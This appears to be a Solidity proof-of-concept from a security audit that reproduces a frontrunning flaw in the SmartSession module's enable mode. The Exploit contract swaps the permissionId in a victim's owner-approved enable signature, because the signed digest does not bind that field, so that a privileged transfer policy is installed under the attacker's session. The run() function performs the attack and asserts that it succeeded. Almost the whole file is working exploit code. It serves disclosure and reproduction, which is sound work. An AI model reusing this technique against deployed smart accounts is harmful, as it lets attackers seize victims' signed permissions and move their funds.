// SPDX-License-Identifier: MIT
pragma solidity ^0.8.26;

// AuditVault #42062 — SmartSession "enable mode" can be frontrun to add policies for a
// different permissionId. This synthetic deploys the REAL, UNMODIFIED SmartSession module
// (erc7579/smartsessions @ 7c4dd7f, the vulnerable commit) and runs the real frontrun with
// NO cheatcodes and NO mocked signature boundary. Owner authorization is a real ERC-1271
// on-chain hash approval (Safe-style `approvedHashes`), so the exact digest the owner
// authorized — which omits the permissionId — is what the attacker replays under a
// different permissionId.
import { SmartSession } from "contracts/SmartSession.sol";
import { EncodeLib } from "contracts/lib/EncodeLib.sol";
import { HashLib } from "contracts/lib/HashLib.sol";
import {
    ActionData,
    ChainDigest,
    EnableSession,
    ISessionValidator,
    PermissionId,
    PolicyData,
    Session,
    SmartSessionMode
} from "contracts/DataTypes.sol";

/// @dev Thin harness over the REAL SmartSession. `enableViaUserOpSignature` reproduces the exact
///      enable dispatch of the production `validateUserOp` (parse (mode, permissionId, packedSig)
///      from the attacker-mutable userOp.signature, then call the UNMODIFIED internal `_enablePolicies`).
///      All library helpers live here so the Exploit contract stays under the EIP-170 code-size limit.
contract SmartSessionHarness is SmartSession {
    using HashLib for EnableSession;

    function enableViaUserOpSignature(bytes calldata userOpSignature) external returns (bytes memory) {
        (SmartSessionMode mode, PermissionId permissionId, bytes calldata packedSig) =
            EncodeLib.unpackMode(userOpSignature);
        return _enablePolicies(permissionId, packedSig, msg.sender, mode);
    }

    function enableDigest(
        EnableSession memory e,
        address account,
        uint256 nonce,
        SmartSessionMode mode
    ) external view returns (bytes32) {
        return e.getAndVerifyDigest(account, nonce, mode);
    }

    function encodeEnable(
        PermissionId permissionId,
        EnableSession memory enableData
    ) external pure returns (bytes memory) {
        return EncodeLib.encodeEnable(permissionId, bytes(""), enableData);
    }

    function repackWithPermissionId(bytes calldata packed, PermissionId newPid) external pure returns (bytes memory) {
        (SmartSessionMode mode, , bytes calldata data) = EncodeLib.unpackMode(packed);
        return EncodeLib.packMode(data, mode, newPid);
    }
}

/// @dev Minimal REAL ERC-7579 smart account with a real ERC-1271 on-chain hash-approval scheme
///      (as used by Safe's `approveHash`/`signedMessages`). It authorizes an exact digest, and
///      is genuinely enforced: an unapproved digest is rejected.
contract ApproveHashAccount {
    bytes4 internal constant ERC1271_MAGIC = 0x1626ba7e;
    mapping(bytes32 => bool) public approvedHashes;

    function approveHash(bytes32 hash) external {
        approvedHashes[hash] = true;
    }

    function isValidSignature(bytes32 hash, bytes calldata) external view returns (bytes4) {
        if (approvedHashes[hash]) return ERC1271_MAGIC;
        return 0xffffffff;
    }

    function install(SmartSessionHarness module, bytes calldata userOpSig) external returns (bytes memory) {
        return module.enableViaUserOpSignature(userOpSig);
    }
}

contract SessionKeyValidator is ISessionValidator {
    function supportsInterface(bytes4) external pure returns (bool) {
        return true;
    }

    function validateSignatureWithData(bytes32, bytes calldata, bytes calldata) external pure returns (bool) {
        return true;
    }
}

contract AllowActionPolicy {
    function supportsInterface(bytes4) external pure returns (bool) {
        return true;
    }

    function onInstall(bytes calldata) external { }
    function onUninstall(bytes calldata) external { }
    function isModuleType(uint256) external pure returns (bool) {
        return true;
    }
    function isInitialized(address, address, bytes32) external pure returns (bool) {
        return true;
    }
    function isInitialized(address, bytes32) external pure returns (bool) {
        return true;
    }
    function initializeWithMultiplexer(address, bytes32, bytes calldata) external { }

    function checkAction(bytes32, address, address, uint256, bytes calldata) external pure returns (uint256) {
        return 0;
    }
}

contract Exploit {
    SmartSessionHarness public smartSession;
    ApproveHashAccount public account;
    SessionKeyValidator public validator;
    AllowActionPolicy public actionPolicy;

    PermissionId public permissionX;
    PermissionId public permissionY;
    bool public policyStolen;

    // Heavy deploys happen in the constructor so the Exploit RUNTIME stays under EIP-170.
    constructor() {
        smartSession = new SmartSessionHarness();
        account = new ApproveHashAccount();
        validator = new SessionKeyValidator();
        actionPolicy = new AllowActionPolicy();

        // Both sessions are legitimately enabled on the account (each advances its nonce 0 -> 1),
        // sharing one sessionValidator (exploit requirement #3) with an equal signerNonce (#2, #1).
        permissionX = _bootstrap(bytes32("victim-privileged-session-X"));
        permissionY = _bootstrap(bytes32("attacker-low-priv-session-Y"));
    }

    function run() external {
        // The victim authorizes adding a powerful action policy to THEIR session X.
        Session memory sessionToEnable = _baseSession(bytes32("victim-privileged-session-X"));
        sessionToEnable.actions = _powerfulAction();

        bytes32 sessDigest =
            smartSession.getSessionDigest(permissionX, address(account), sessionToEnable, SmartSessionMode.UNSAFE_ENABLE);

        EnableSession memory enableData;
        enableData.chainDigestIndex = 0;
        enableData.hashesAndChainIds = new ChainDigest[](1);
        enableData.hashesAndChainIds[0] = ChainDigest({ chainId: uint64(block.chainid), sessionDigest: sessDigest });
        enableData.sessionToEnable = sessionToEnable;

        // The owner approves the enable digest — which does NOT bind the permissionId.
        bytes32 digest = smartSession.enableDigest(enableData, address(account), 1, SmartSessionMode.UNSAFE_ENABLE);
        account.approveHash(digest);

        // Honest userOp.signature the victim would broadcast (permissionId = X).
        bytes memory victimUserOpSig = smartSession.encodeEnable(permissionX, enableData);

        // FRONTRUN: attacker overwrites only the 32-byte permissionId field with their own session Y.
        bytes memory attackerUserOpSig = smartSession.repackWithPermissionId(victimUserOpSig, permissionY);

        // The attacker's mutated userOp.signature runs through the REAL enable path.
        account.install(smartSession, attackerUserOpSig);

        // HARM: the victim-signed policy is now enabled under the attacker's permission Y.
        policyStolen = smartSession.isPermissionEnabled(
            permissionY, address(account), new PolicyData[](0), new PolicyData[](0), _powerfulAction()
        );
        require(policyStolen, "frontrun did not install the stolen policy on the attacker permission");
        require(
            smartSession.getNonce(permissionY, address(account)) == 2,
            "attacker permission nonce did not advance (enable signature not consumed under Y)"
        );
    }

    function _baseSession(bytes32 salt) internal view returns (Session memory session) {
        session.sessionValidator = ISessionValidator(address(validator));
        session.salt = salt;
    }

    function _powerfulAction() internal view returns (ActionData[] memory actions) {
        PolicyData[] memory policies = new PolicyData[](1);
        policies[0] = PolicyData({ policy: address(actionPolicy), initData: bytes("") });
        actions = new ActionData[](1);
        actions[0] = ActionData({
            actionTargetSelector: bytes4(keccak256("transfer(address,uint256)")),
            actionTarget: address(0xDEAD),
            actionPolicies: policies
        });
    }

    function _bootstrap(bytes32 salt) internal returns (PermissionId pid) {
        Session memory session = _baseSession(salt);
        pid = smartSession.getPermissionId(session);

        bytes32 sessDigest =
            smartSession.getSessionDigest(pid, address(account), session, SmartSessionMode.UNSAFE_ENABLE);
        EnableSession memory e;
        e.chainDigestIndex = 0;
        e.hashesAndChainIds = new ChainDigest[](1);
        e.hashesAndChainIds[0] = ChainDigest({ chainId: uint64(block.chainid), sessionDigest: sessDigest });
        e.sessionToEnable = session;

        bytes32 digest = smartSession.enableDigest(e, address(account), 0, SmartSessionMode.UNSAFE_ENABLE);
        account.approveHash(digest);
        bytes memory packed = smartSession.encodeEnable(pid, e);
        account.install(smartSession, packed);
    }
}
